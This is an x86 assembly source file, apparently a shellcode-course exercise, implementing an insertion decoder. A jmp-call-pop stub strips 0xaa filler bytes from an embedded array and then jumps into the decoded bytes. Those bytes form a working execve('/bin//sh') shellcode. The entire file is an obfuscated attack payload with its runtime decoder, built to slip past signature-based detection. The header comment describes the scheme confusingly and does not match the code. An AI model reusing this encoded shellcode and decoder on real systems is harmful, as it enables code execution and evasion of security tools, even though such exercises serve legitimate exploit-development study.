;Author: Eduardo
;Filename: insertion_decoder.asm
;A NOT encoded program which shellcode is decode in memory by using two's complement  the xor operation instead of using the length of the shellcode to be decoded.
;Generally the marker is the xor key
;

global _start

section .text
_start:

	jmp short call_decoder

decoder:

	pop esi
	lea edi, [esi + 1]
	xor ecx, ecx
	mov cl, 1
	xor ebx, ebx

decode:
	mov bl, byte [esi + ecx]
	xor bl, 0xaa
	jnz short Shellcode	; reached the marker if Zero Flag not set
	mov bl, byte [esi + ecx + 1]
	mov byte [edi], bl
	inc edi
	add cl, 2
	jmp short decode


call_decoder:

	call decoder
	Shellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0xb,0xaa,0xcd,0xaa,0x80,0xaa, 0xbb, 0xbb 	; added 0xbb,0xbb has a stop marker

